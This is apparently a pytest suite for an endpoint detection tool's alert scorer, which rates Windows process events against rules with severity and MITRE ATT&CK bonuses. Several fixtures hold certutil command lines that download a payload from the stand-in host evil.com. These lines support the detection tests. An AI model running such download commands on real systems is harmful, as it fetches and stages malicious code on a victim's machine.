"""
Tests for alert scoring system
"""
import pytest
from datetime import datetime
from core.scorer import Scorer
from core.rule_loader import Rule
from collectors.base import Event


def test_scorer_initialization():
    """Test Scorer initializes correctly"""
    scorer = Scorer()
    assert scorer is not None
    assert scorer.MAX_SCORE == 150
    assert scorer.MIN_SCORE == 0


def test_severity_base_scores():
    """Test base scores for each severity level"""
    scorer = Scorer()

    # Critical severity
    rule_critical = Rule({
        'name': 'Critical Rule',
        'id': 'WIN-001',
        'platform': 'windows',
        'severity': 'critical',
        'detection': {'process_name': 'test.exe'}
    })
    event = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='test.exe',
        command_line='test.exe',
        user='user',
        process_id=1234
    )
    score = scorer.score_alert(rule_critical, event)
    assert score == 100  # Base critical score

    # High severity
    rule_high = Rule({
        'name': 'High Rule',
        'id': 'WIN-002',
        'platform': 'windows',
        'severity': 'high',
        'detection': {'process_name': 'test.exe'}
    })
    score = scorer.score_alert(rule_high, event)
    assert score == 75  # Base high score

    # Medium severity
    rule_medium = Rule({
        'name': 'Medium Rule',
        'id': 'WIN-003',
        'platform': 'windows',
        'severity': 'medium',
        'detection': {'process_name': 'test.exe'}
    })
    score = scorer.score_alert(rule_medium, event)
    assert score == 50  # Base medium score

    # Low severity
    rule_low = Rule({
        'name': 'Low Rule',
        'id': 'WIN-004',
        'platform': 'windows',
        'severity': 'low',
        'detection': {'process_name': 'test.exe'}
    })
    score = scorer.score_alert(rule_low, event)
    assert score == 25  # Base low score


def test_detection_criteria_bonus():
    """Test bonus points for detection criteria beyond process_name"""
    scorer = Scorer()
    event = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='cmd.exe',
        command_line='cmd.exe /c whoami',
        user='user',
        process_id=1234
    )

    # Rule with just process_name (no bonus)
    rule1 = Rule({
        'name': 'Rule 1',
        'id': 'WIN-010',
        'platform': 'windows',
        'severity': 'high',
        'detection': {'process_name': 'cmd.exe'}
    })
    score1 = scorer.score_alert(rule1, event)
    assert score1 == 75  # Just base score

    # Rule with process_name + command_contains (1 bonus)
    rule2 = Rule({
        'name': 'Rule 2',
        'id': 'WIN-011',
        'platform': 'windows',
        'severity': 'high',
        'detection': {
            'process_name': 'cmd.exe',
            'command_contains': ['whoami']
        }
    })
    score2 = scorer.score_alert(rule2, event)
    assert score2 == 75 + 20  # Base + 1 criterion bonus

    # Rule with process_name + command_contains + command_regex (2 bonuses)
    rule3 = Rule({
        'name': 'Rule 3',
        'id': 'WIN-012',
        'platform': 'windows',
        'severity': 'high',
        'detection': {
            'process_name': 'cmd.exe',
            'command_contains': ['whoami'],
            'command_regex': r'whoami'
        }
    })
    score3 = scorer.score_alert(rule3, event)
    assert score3 == 75 + 40  # Base + 2 criteria bonuses


def test_parent_process_bonus():
    """Test bonus for parent process context"""
    scorer = Scorer()
    rule = Rule({
        'name': 'Test Rule',
        'id': 'WIN-020',
        'platform': 'windows',
        'severity': 'medium',
        'detection': {'process_name': 'cmd.exe'}
    })

    # Event without parent process
    event1 = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='cmd.exe',
        command_line='cmd.exe',
        user='user',
        process_id=1234,
        parent_process_name=None
    )
    score1 = scorer.score_alert(rule, event1)
    assert score1 == 50  # No parent process bonus

    # Event with parent process
    event2 = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='cmd.exe',
        command_line='cmd.exe',
        user='user',
        process_id=1234,
        parent_process_name='winword.exe'
    )
    score2 = scorer.score_alert(rule, event2)
    assert score2 == 50 + 15  # Base + parent process bonus


def test_mitre_attack_bonus():
    """Test bonus for MITRE ATT&CK techniques"""
    scorer = Scorer()
    event = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='cmd.exe',
        command_line='cmd.exe',
        user='user',
        process_id=1234
    )

    # Rule with no MITRE techniques
    rule1 = Rule({
        'name': 'Rule 1',
        'id': 'WIN-030',
        'platform': 'windows',
        'severity': 'medium',
        'detection': {'process_name': 'cmd.exe'}
    })
    score1 = scorer.score_alert(rule1, event)
    assert score1 == 50  # No MITRE bonus

    # Rule with 1 MITRE technique
    rule2 = Rule({
        'name': 'Rule 2',
        'id': 'WIN-031',
        'platform': 'windows',
        'severity': 'medium',
        'mitre_attack': ['T1059'],
        'detection': {'process_name': 'cmd.exe'}
    })
    score2 = scorer.score_alert(rule2, event)
    assert score2 == 50 + 10  # Base + 1 technique bonus

    # Rule with 3 MITRE techniques
    rule3 = Rule({
        'name': 'Rule 3',
        'id': 'WIN-032',
        'platform': 'windows',
        'severity': 'medium',
        'mitre_attack': ['T1059', 'T1105', 'T1140'],
        'detection': {'process_name': 'cmd.exe'}
    })
    score3 = scorer.score_alert(rule3, event)
    assert score3 == 50 + 30  # Base + 3 technique bonuses


def test_combined_bonuses():
    """Test combination of all bonus types"""
    scorer = Scorer()

    # Event with parent process
    event = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='certutil.exe',
        command_line='certutil.exe -urlcache http://evil.com',
        user='user',
        process_id=1234,
        parent_process_name='cmd.exe'
    )

    # Rule with:
    # - High severity (75)
    # - 2 detection criteria beyond process_name: command_contains, command_regex (40)
    # - Parent process in event (15)
    # - 2 MITRE techniques (20)
    # Total: 75 + 40 + 15 + 20 = 150
    rule = Rule({
        'name': 'Complex Rule',
        'id': 'WIN-040',
        'platform': 'windows',
        'severity': 'high',
        'mitre_attack': ['T1105', 'T1140'],
        'detection': {
            'process_name': 'certutil.exe',
            'command_contains': ['-urlcache'],
            'command_regex': r'http'
        }
    })

    score = scorer.score_alert(rule, event)
    assert score == 150  # Maximum score


def test_score_capping_at_max():
    """Test that scores are capped at MAX_SCORE (150)"""
    scorer = Scorer()

    event = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='test.exe',
        command_line='test command',
        user='user',
        process_id=1234,
        parent_process_name='parent.exe'
    )

    # Rule that would exceed 150:
    # - Critical severity (100)
    # - 4 detection criteria (80)
    # - Parent process (15)
    # - 3 MITRE techniques (30)
    # Total would be 225, but should cap at 150
    rule = Rule({
        'name': 'Over Max Rule',
        'id': 'WIN-050',
        'platform': 'windows',
        'severity': 'critical',
        'mitre_attack': ['T1059', 'T1105', 'T1140'],
        'detection': {
            'process_name': 'test.exe',
            'command_contains': ['test'],
            'command_regex': r'test',
            'parent_process': 'parent.exe',
            'user_pattern': r'user'
        }
    })

    score = scorer.score_alert(rule, event)
    assert score == 150  # Capped at maximum


def test_score_is_integer():
    """Test that scores are always integers"""
    scorer = Scorer()
    event = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='cmd.exe',
        command_line='cmd.exe',
        user='user',
        process_id=1234
    )
    rule = Rule({
        'name': 'Test',
        'id': 'WIN-060',
        'platform': 'windows',
        'severity': 'medium',
        'detection': {'process_name': 'cmd.exe'}
    })

    score = scorer.score_alert(rule, event)
    assert isinstance(score, int)


def test_minimum_score():
    """Test minimum score scenarios"""
    scorer = Scorer()
    event = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='test.exe',
        command_line='test',
        user='user',
        process_id=1234
    )

    # Low severity with minimal detection
    rule = Rule({
        'name': 'Minimal Rule',
        'id': 'WIN-070',
        'platform': 'windows',
        'severity': 'low',
        'detection': {'process_name': 'test.exe'}
    })

    score = scorer.score_alert(rule, event)
    assert score == 25  # Minimum realistic score (low severity)
    assert score >= scorer.MIN_SCORE


def test_get_severity_thresholds():
    """Test retrieving severity thresholds"""
    scorer = Scorer()
    thresholds = scorer.get_severity_thresholds()

    assert thresholds['critical'] == 100
    assert thresholds['high'] == 75
    assert thresholds['medium'] == 50
    assert thresholds['low'] == 25


def test_interpret_score():
    """Test score interpretation"""
    scorer = Scorer()

    assert scorer.interpret_score(140) == "Critical - Immediate action required"
    assert scorer.interpret_score(100) == "High - Prioritize investigation"
    assert scorer.interpret_score(70) == "Medium - Review when possible"
    assert scorer.interpret_score(40) == "Low - Monitor for patterns"
    assert scorer.interpret_score(20) == "Informational - Low priority"


def test_all_detection_criteria_types():
    """Test that all detection criterion types are counted"""
    scorer = Scorer()
    event = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='cmd.exe',
        command_line='cmd.exe /c whoami',
        user='administrator',
        process_id=1234
    )

    # Rule with all 4 detection criteria types (beyond process_name)
    rule = Rule({
        'name': 'Full Criteria Rule',
        'id': 'WIN-080',
        'platform': 'windows',
        'severity': 'low',
        'detection': {
            'process_name': 'cmd.exe',
            'command_contains': ['whoami'],
            'command_regex': r'whoami',
            'parent_process': 'explorer.exe',
            'user_pattern': r'^admin'
        }
    })

    # Low (25) + 4 criteria (80) = 105
    score = scorer.score_alert(rule, event)
    assert score == 105


def test_empty_mitre_attack_list():
    """Test handling of empty MITRE ATT&CK list"""
    scorer = Scorer()
    event = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='test.exe',
        command_line='test',
        user='user',
        process_id=1234
    )

    # Rule with empty mitre_attack list
    rule = Rule({
        'name': 'No MITRE Rule',
        'id': 'WIN-090',
        'platform': 'windows',
        'severity': 'medium',
        'mitre_attack': [],
        'detection': {'process_name': 'test.exe'}
    })

    score = scorer.score_alert(rule, event)
    assert score == 50  # Just base score, no MITRE bonus


def test_integration_with_real_rule():
    """Test scoring with the actual certutil rule from the repository"""
    scorer = Scorer()

    # Simulate the WIN-001 certutil rule
    rule = Rule({
        'name': 'Certutil Download Suspicious File',
        'id': 'WIN-001',
        'platform': 'windows',
        'severity': 'high',
        'mitre_attack': ['T1105', 'T1140'],
        'detection': {
            'process_name': 'certutil.exe',
            'command_contains': ['-urlcache', 'http']
        },
        'whitelist': {
            'parent_processes': ['msiexec.exe', 'sccm.exe'],
            'users': ['SYSTEM']
        }
    })

    # Suspicious event (not whitelisted)
    event = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='certutil.exe',
        command_line='certutil.exe -urlcache -split -f http://evil.com/payload.exe',
        user='baduser',
        process_id=1234,
        parent_process_name='cmd.exe'
    )

    # High (75) + command_contains (20) + parent process context (15) + 2 MITRE (20) = 130
    score = scorer.score_alert(rule, event)
    assert score == 130


def test_detection_criteria_count_method():
    """Test the internal _count_detection_criteria method"""
    scorer = Scorer()

    # Rule with no extra criteria
    rule1 = Rule({
        'name': 'Rule 1',
        'id': 'WIN-100',
        'platform': 'windows',
        'severity': 'low',
        'detection': {'process_name': 'test.exe'}
    })
    assert scorer._count_detection_criteria(rule1) == 0

    # Rule with 2 criteria
    rule2 = Rule({
        'name': 'Rule 2',
        'id': 'WIN-101',
        'platform': 'windows',
        'severity': 'low',
        'detection': {
            'process_name': 'test.exe',
            'command_contains': ['test'],
            'parent_process': 'parent.exe'
        }
    })
    assert scorer._count_detection_criteria(rule2) == 2
